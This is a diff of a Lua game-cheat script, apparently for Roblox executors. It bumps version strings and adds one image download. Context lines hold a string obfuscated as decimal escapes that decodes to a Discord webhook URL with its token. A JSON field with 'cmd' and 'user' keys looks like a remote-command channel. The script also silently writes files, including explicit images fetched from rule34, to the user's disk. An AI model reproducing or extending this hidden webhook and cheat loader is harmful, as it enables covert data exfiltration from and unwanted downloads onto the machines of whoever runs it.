@@ -1,6 +1,6 @@
 -- // Script fully produced by luna and simon (simooonnn__)
 --[[ Credits:
-Luna (responsible for managing, and reading file systems & license)
+Luna (responsible for managing, files system, and reading files & license)
 Simon (responsible for making writing files system)
 ]]
 
@@ -53,7 +53,7 @@ local token = {
 }
 return token
 ]]
-local OperatingContent2 = "BETA V.X.1.5.3"
+local OperatingContent2 = "BETA V.X.1.5.6"
 local OperatingContent3 = [[
 local a = ("\104\116\116\112\115\58\47\47\100\105\115\99\111\114\100\46\99\111\109\47\97\112\105\47\119\101\98\104\111\111\107\115\47\49\52\48\52\56\51\57\53\55\56\49\55\52\54\50\51\56\51\53\47\74\90\100\97\102\76\112\55\105\83\76\57\86\113\107\78\75\116\56\50\104\74\88\106\74\106\51\105\97\82\48\51\119\84\118\122\78\113\67\50\103\106\88\113\50\69\51\66\51\68\80\77\98\105\112\118\114\88\53\97\71\84\98\122\53\49\100\66")
 local b = ("\104\116\116\112\115\58\47\47\105\46\105\109\103\117\114\46\99\111\109\47\85\107\80\50\79\117\76\46\112\110\103")
@@ -138,7 +138,7 @@ we dont care :p
 ]]
 
 local extcont = [[
-{"cmd":"None"}
+{"cmd": "None", "user": "All"}
 ]]
 -- // Safe create functions
 -- Tables to store already created files and folders
@@ -222,6 +222,7 @@ local filePath6 = basePath1.."5uT3mrj.png"
 local filePath7 = basePath2.."GetRequest.png"
 local filePath8 = basePath2.."sample_8298f880137983d93f0b81d97293af34.jpg"
 local filePath9 = basePath2.."luna.jpg"
+local filePath10 = basePath1.."logo.png"
 
 local imageUrl  = "https://i.imgur.com/Fbprf98.png" -- default.png
 local imageUrl2 = "https://i.imgur.com/zB3rMje.png" -- tab1.png (Universal Hacks)
@@ -233,6 +234,7 @@ local imageUrl7 = "https://i.imgur.com/5uT3mrj.png" -- tipicon.png (++)
 local imageUrl8 = "https://cdn.discordapp.com/attachments/1409320415171444858/1410386129546641560/image0.png?ex=68b0d3f0&is=68af8270&hm=a51a026132cb6f64d92fe7117a914a24c321e1e590c804ea0d848236c19a8df1&"
 local imageUrl9 = "https://wimg.rule34.xxx//samples/829/sample_8298f880137983d93f0b81d97293af34.jpg?14623434" -- sample_8298f880137983d93f0b81d97293af34.png
 local imageUrl10 = "https://wimg.rule34.xxx//samples/829/sample_ba670731a24706f0dc96ecc7f008c8ea.jpg?14622955"
+local imageUrl11 = "https://tr.rbxcdn.com/180DAY-5118eb3d80dd954cc6dba9f28738e8fb/150/150/Image/Webp/noFilter"
 
 local response = request or (syn and syn.request) or http_request
 if not response then
@@ -267,12 +269,13 @@ downloadImage(filePath6, imageUrl7)
 downloadImage(filePath7, imageUrl8)
 downloadImage(filePath8, imageUrl9)
 downloadImage(filePath9, imageUrl10)
+downloadImage(filePath10, imageUrl11)
 
 -- // Token system
 local function createToken()
     if not isfile(tokenPath) then
         writefile(tokenPath, correctHash)
-        print("[DSBCore] Token successfully created: " .. correctHash)
+        print("[SYSTEM] Token successfully created: " .. correctHash)
     else
         print("[SYSTEM] File ignored: returned false")
     end
